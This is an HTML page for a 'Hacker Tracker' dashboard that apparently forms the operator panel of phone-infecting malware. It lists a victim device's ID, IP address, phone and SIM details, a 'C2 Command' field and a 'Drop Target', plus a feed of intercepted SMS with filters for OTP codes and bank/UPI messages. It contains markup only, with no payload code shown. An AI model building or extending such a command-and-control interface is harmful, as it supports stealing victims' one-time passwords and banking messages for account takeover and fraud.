<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hacker Tracker · 03e768e104ef026d</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <!-- Header -->
    <header class="header">
      <div class="header-left">
        <h1 class="logo">Hacker Tracker</h1>
        <div class="device-id-badge" id="copyIdBtn" title="Click to copy device ID">
          <code>03e768e104ef026d</code>
          <span class="copy-hint" id="copyHint">copy</span>
        </div>
        <div class="status-pill online" id="statusPill">
          <span class="dot"></span>
          <span id="statusText">Online</span>
        </div>
      </div>

      <div class="header-right">
        <span class="meta-item">Updated: <strong id="lastUpdated">--</strong></span>
        <button class="btn btn-secondary" id="refreshBtn">Refresh</button>
        <label class="auto-refresh-label">
          <input type="checkbox" id="autoRefreshCheck" checked> Auto (15s)
        </label>
      </div>
    </header>

    <!-- Quick Stats Bar -->
    <section class="stats-bar">
      <div class="stat-item">
        <span class="stat-label">Battery</span>
        <span class="stat-value" id="batteryVal">--%</span>
      </div>
      <div class="stat-item">
        <span class="stat-label">IP Address</span>
        <span class="stat-value font-mono" id="ipVal">--</span>
      </div>
      <div class="stat-item">
        <span class="stat-label">Phone & SIM</span>
        <span class="stat-value font-mono" id="phoneVal">--</span>
      </div>
      <div class="stat-item">
        <span class="stat-label">Model / OS</span>
        <span class="stat-value" id="modelVal">--</span>
      </div>
      <div class="stat-item">
        <span class="stat-label">C2 Command</span>
        <span class="stat-value font-mono" id="cmdVal">--</span>
      </div>
      <div class="stat-item">
        <span class="stat-label">Liveness</span>
        <span class="stat-value font-mono text-green" id="livenessVal">--</span>
      </div>
      <div class="stat-item">
        <span class="stat-label">Drop Target</span>
        <span class="stat-value font-mono text-amber" id="dropTargetVal">--</span>
      </div>
    </section>

    <!-- Message Stream -->
    <main class="main">
      <div class="toolbar">
        <div class="filters">
          <button class="filter-btn active" data-filter="all">All (<span id="countAll">0</span>)</button>
          <button class="filter-btn" data-filter="otp">🔑 OTPs & Codes (<span id="countOtp">0</span>)</button>
          <button class="filter-btn" data-filter="bank">🏦 Bank / UPI (<span id="countBank">0</span>)</button>
        </div>

        <div class="search-wrap">
          <input type="text" id="searchInput" placeholder="Search message, sender, OTP...">
          <button id="clearSearch" class="btn-clear">✕</button>
        </div>
      </div>

      <!-- Messages Table / List -->
      <div class="messages-container" id="messagesList">
        <div class="empty">Loading messages...</div>
      </div>

      <div class="footer-bar">
        <span id="footerCount">Showing 0 messages</span>
        <div class="pagination">
          <button class="btn btn-secondary btn-sm" id="prevBtn" disabled>Previous</button>
          <span class="page-num" id="pageLabel">Page 1</span>
          <button class="btn btn-secondary btn-sm" id="nextBtn">Next</button>
        </div>
      </div>
    </main>
  </div>

  <script src="app.js"></script>
</body>
</html>
